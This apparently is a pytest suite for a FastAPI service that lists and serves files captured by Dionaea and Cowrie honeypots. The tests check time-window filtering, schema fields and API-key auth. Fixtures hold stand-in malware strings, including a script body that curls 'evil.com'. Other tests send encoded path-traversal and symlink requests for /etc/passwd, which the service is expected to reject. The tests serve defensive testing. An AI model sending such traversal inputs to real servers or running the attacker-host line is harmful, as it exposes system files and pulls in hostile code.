"""Tests for the FastAPI endpoints (``/recent`` and ``/download``).

Uses temporary directories with controlled mtimes to simulate honeypot
data directories, and patches ``app.config`` values so the endpoints
scan test fixtures instead of ``/data``.
"""

import os
import tempfile
import time
from pathlib import Path
from unittest.mock import patch

import magic
from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _create_payload_tree(base: Path) -> dict:
    """Create a realistic honeypot directory tree under *base*.

    Returns a dict with paths and metadata for assertions.
    """
    # dionaea/binaries/sample.bin — recent file
    dionaea_dir = base / "dionaea" / "binaries"
    dionaea_dir.mkdir(parents=True)
    recent_file = dionaea_dir / "sample.bin"
    recent_file.write_bytes(b"malicious ELF content for testing")

    # cowrie/downloads/old.sh — old file (mtime set to 2 hours ago)
    cowrie_dir = base / "cowrie" / "downloads"
    cowrie_dir.mkdir(parents=True)
    old_file = cowrie_dir / "old.sh"
    old_file.write_bytes(b"#!/bin/bash\necho pwned")
    old_time = time.time() - 7200
    os.utime(old_file, (old_time, old_time))

    return {
        "recent_file": recent_file,
        "old_file": old_file,
        "recent_mtime": recent_file.stat().st_mtime,
        "old_mtime": old_time,
    }


# ---------------------------------------------------------------------------
# /api/v1/payloads/recent
# ---------------------------------------------------------------------------


class TestListRecentPayloads:
    """Tests for GET /api/v1/payloads/recent."""

    def test_returns_recent_payloads(self) -> None:
        """Recent files within the time window should be returned."""
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))
            now = time.time()

            with (
                patch("app.routes.BASE_DATA_DIR", td),
                patch("app.routes.HONEYPOT_DIRS", ["dionaea/binaries", "cowrie/downloads"]),
                patch("app.scanner.magic.Magic", side_effect=magic.MagicException("no libmagic")),
            ):
                response = client.get(
                    "/api/v1/payloads/recent",
                    params={"start_ts": now - 60, "end_ts": now + 60},
                )

            assert response.status_code == 200
            data = response.json()
            # Only the recent file should be returned
            assert len(data) == 1
            payload = data[0]
            assert payload["sha256"] is not None
            assert len(payload["sha256"]) == 64
            assert payload["source_honeypot"] == "dionaea"
            assert payload["size"] > 0
            assert payload["locator"] == "dionaea/binaries/sample.bin"

    def test_empty_window_returns_empty_list(self) -> None:
        """A time window in the past with no matching files returns []."""
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))

            with (
                patch("app.routes.BASE_DATA_DIR", td),
                patch("app.routes.HONEYPOT_DIRS", ["dionaea/binaries", "cowrie/downloads"]),
            ):
                # Window far in the past
                response = client.get(
                    "/api/v1/payloads/recent",
                    params={"start_ts": 0, "end_ts": 1},
                )

            assert response.status_code == 200
            assert response.json() == []

    def test_start_ts_after_end_ts_returns_422(self) -> None:
        """start_ts > end_ts should be rejected."""
        response = client.get(
            "/api/v1/payloads/recent",
            params={"start_ts": 100, "end_ts": 50},
        )
        assert response.status_code == 422

    def test_missing_params_returns_422(self) -> None:
        """Omitting required query params should return 422."""
        response = client.get("/api/v1/payloads/recent")
        assert response.status_code == 422


# ---------------------------------------------------------------------------
# /api/v1/payloads/download/{locator:path}
# ---------------------------------------------------------------------------


class TestDownloadPayload:
    """Tests for GET /api/v1/payloads/download/{locator}."""

    def test_download_existing_file(self) -> None:
        """Downloading by a valid locator should return the file bytes."""
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))

            with patch("app.routes.BASE_DATA_DIR", td):
                download_resp = client.get(
                    "/api/v1/payloads/download/dionaea/binaries/sample.bin",
                )

            assert download_resp.status_code == 200
            assert download_resp.content == b"malicious ELF content for testing"
            assert download_resp.headers["content-type"] == "application/octet-stream"

    def test_download_nonexistent_locator_returns_404(self) -> None:
        """Requesting a locator that doesn't match any file should return 404."""
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))
            with patch("app.routes.BASE_DATA_DIR", td):
                response = client.get(
                    "/api/v1/payloads/download/dionaea/binaries/nonexistent.bin",
                )

        assert response.status_code == 404

    def test_download_path_traversal_returns_422(self) -> None:
        """A locator attempting path traversal should be rejected with 422."""
        with (
            tempfile.TemporaryDirectory() as td,
            patch("app.routes.BASE_DATA_DIR", td),
        ):
            # Use URL-encoded dots (%2e) to bypass HTTP client normalization.
            # This is the realistic attack vector.
            response = client.get(
                "/api/v1/payloads/download/%2e%2e/%2e%2e/etc/passwd",
            )

        assert response.status_code == 422
        assert "path traversal" in response.json()["detail"].lower()

    def test_download_absolute_path_returns_422(self) -> None:
        """A locator with an absolute path should be rejected with 422."""
        with (
            tempfile.TemporaryDirectory() as td,
            patch("app.routes.BASE_DATA_DIR", td),
        ):
            response = client.get(
                "/api/v1/payloads/download/%2fetc%2fpasswd",
            )

        assert response.status_code == 422
        assert "absolute" in response.json()["detail"].lower()

    def test_download_symlink_escape_returns_422(self) -> None:
        """A symlink inside BASE_DATA_DIR pointing outside should be rejected."""
        with tempfile.TemporaryDirectory() as td:
            # Create a symlink inside the data dir that points to /etc/passwd
            link_dir = Path(td) / "dionaea" / "binaries"
            link_dir.mkdir(parents=True)
            symlink = link_dir / "evil_link"
            symlink.symlink_to("/etc/passwd")

            with patch("app.routes.BASE_DATA_DIR", td):
                response = client.get(
                    "/api/v1/payloads/download/dionaea/binaries/evil_link",
                )

        assert response.status_code == 422
        assert "path traversal" in response.json()["detail"].lower()

    def test_download_content_disposition_header(self) -> None:
        """Download response should include a Content-Disposition header with the filename."""
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))

            with patch("app.routes.BASE_DATA_DIR", td):
                resp = client.get(
                    "/api/v1/payloads/download/dionaea/binaries/sample.bin",
                )

            assert resp.status_code == 200
            assert "sample.bin" in resp.headers.get("content-disposition", "")

    def test_download_roundtrip_with_recent(self) -> None:
        """Locator from /recent should work directly with /download."""
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))
            now = time.time()

            with (
                patch("app.routes.BASE_DATA_DIR", td),
                patch("app.routes.HONEYPOT_DIRS", ["dionaea/binaries", "cowrie/downloads"]),
                patch("app.scanner.magic.Magic", side_effect=magic.MagicException("no libmagic")),
            ):
                list_resp = client.get(
                    "/api/v1/payloads/recent",
                    params={"start_ts": now - 60, "end_ts": now + 60},
                )

            locator = list_resp.json()[0]["locator"]

            with patch("app.routes.BASE_DATA_DIR", td):
                download_resp = client.get(f"/api/v1/payloads/download/{locator}")

            assert download_resp.status_code == 200
            assert download_resp.content == b"malicious ELF content for testing"


class TestRecentResponseSchema:
    """Tests for /recent response structure and schema validation."""

    def test_response_contains_all_required_fields(self) -> None:
        """Each payload in the response should have all PayloadMetadata fields."""
        required_fields = {
            "locator",
            "mime_type",
            "md5",
            "sha1",
            "sha256",
            "mtime",
            "size",
            "source_honeypot",
        }
        with tempfile.TemporaryDirectory() as td:
            _create_payload_tree(Path(td))
            now = time.time()

            with (
                patch("app.routes.BASE_DATA_DIR", td),
                patch("app.routes.HONEYPOT_DIRS", ["dionaea/binaries"]),
                patch("app.scanner.magic.Magic", side_effect=magic.MagicException("no libmagic")),
            ):
                response = client.get(
                    "/api/v1/payloads/recent",
                    params={"start_ts": now - 60, "end_ts": now + 60},
                )

            data = response.json()
            assert len(data) == 1
            assert required_fields.issubset(data[0].keys())

    def test_multiple_honeypot_dirs_aggregated(self) -> None:
        """Files from multiple honeypot dirs should all appear in the response."""
        with tempfile.TemporaryDirectory() as td:
            # Create files in two different honeypot dirs
            dionaea_dir = Path(td) / "dionaea" / "binaries"
            dionaea_dir.mkdir(parents=True)
            (dionaea_dir / "malware.bin").write_bytes(b"ELF binary content")

            cowrie_dir = Path(td) / "cowrie" / "downloads"
            cowrie_dir.mkdir(parents=True)
            (cowrie_dir / "script.sh").write_bytes(b"#!/bin/bash\ncurl evil.com")

            now = time.time()
            with (
                patch("app.routes.BASE_DATA_DIR", td),
                patch("app.routes.HONEYPOT_DIRS", ["dionaea/binaries", "cowrie/downloads"]),
                patch("app.scanner.magic.Magic", side_effect=magic.MagicException("no libmagic")),
            ):
                response = client.get(
                    "/api/v1/payloads/recent",
                    params={"start_ts": now - 60, "end_ts": now + 60},
                )

            data = response.json()
            assert len(data) == 2
            sources = {p["source_honeypot"] for p in data}
            assert sources == {"dionaea", "cowrie"}


# ---------------------------------------------------------------------------
# API key authentication
# ---------------------------------------------------------------------------


class TestApiKeyAuth:
    """Tests for API key authentication on protected endpoints."""

    def test_rejects_missing_key_when_configured(self) -> None:
        """Endpoints should return 403 when API_KEY is set but not provided."""
        with patch("app.auth.API_KEY", "test-secret-key"):
            response = client.get(
                "/api/v1/payloads/recent",
                params={"start_ts": 0, "end_ts": 1},
            )
        assert response.status_code == 403

    def test_rejects_wrong_key(self) -> None:
        """Endpoints should return 403 when the wrong key is provided."""
        with patch("app.auth.API_KEY", "test-secret-key"):
            response = client.get(
                "/api/v1/payloads/recent",
                params={"start_ts": 0, "end_ts": 1},
                headers={"X-API-Key": "wrong-key"},
            )
        assert response.status_code == 403

    def test_accepts_correct_key(self) -> None:
        """Endpoints should succeed when the correct API key is provided."""
        with (
            tempfile.TemporaryDirectory() as td,
            patch("app.auth.API_KEY", "test-secret-key"),
            patch("app.routes.BASE_DATA_DIR", td),
            patch("app.routes.HONEYPOT_DIRS", []),
        ):
            response = client.get(
                "/api/v1/payloads/recent",
                params={"start_ts": 0, "end_ts": 1},
                headers={"X-API-Key": "test-secret-key"},
            )
        assert response.status_code == 200

    def test_no_auth_when_key_not_configured(self) -> None:
        """When API_KEY is empty, requests should pass without a key."""
        with (
            tempfile.TemporaryDirectory() as td,
            patch("app.auth.API_KEY", ""),
            patch("app.routes.BASE_DATA_DIR", td),
            patch("app.routes.HONEYPOT_DIRS", []),
        ):
            response = client.get(
                "/api/v1/payloads/recent",
                params={"start_ts": 0, "end_ts": 1},
            )
        assert response.status_code == 200

    def test_download_rejects_missing_key(self) -> None:
        """The /download endpoint should also enforce API key auth."""
        with patch("app.auth.API_KEY", "test-secret-key"):
            response = client.get("/api/v1/payloads/download/dionaea/binaries/sample.bin")
        assert response.status_code == 403

    def test_download_accepts_correct_key(self) -> None:
        """The /download endpoint should accept a valid API key."""
        with (
            tempfile.TemporaryDirectory() as td,
            patch("app.auth.API_KEY", "test-secret-key"),
            patch("app.routes.BASE_DATA_DIR", td),
        ):
            response = client.get(
                "/api/v1/payloads/download/dionaea/binaries/sample.bin",
                headers={"X-API-Key": "test-secret-key"},
            )
        # 404 is expected (file doesn't exist), but NOT 403
        assert response.status_code == 404
